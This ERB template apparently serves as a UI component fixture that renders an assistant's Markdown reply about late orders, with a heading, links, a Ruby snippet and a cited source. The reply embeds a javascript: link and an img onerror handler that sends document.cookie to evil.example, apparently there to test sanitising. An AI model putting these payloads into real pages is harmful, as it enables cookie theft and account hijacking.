<%# The poetry arm: "an assistant's reply written in Markdown, shown in a
    transcript: its heading, a link out, a block of code, and text in the
    reply that is markup", with the source it cites. %>
<% reply = <<~MARKDOWN
  # Late orders

  Two orders are **late** [1]. See [the guide](https://example.com/fulfilment) or [open the report](javascript:alert(document.cookie)).

  <img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">

  ```ruby
  Order.processing.where(due_on: ...Date.current)
  ```
MARKDOWN
%>
<% sources = [{ title: "Order book, 16 November", href: "https://example.com/orders/late" }] %>
<%= poetry_message do %>
  <%= poetry_bubble(variant: :ghost) do %>
    <%= poetry_markdown(text: reply, heading_level: 3, sources: sources) %>
    <%= poetry_sources do |list| %>
      <% sources.each { |source| list.with_source(source[:title], href: source[:href]) } %>
    <% end %>
  <% end %>
<% end %>
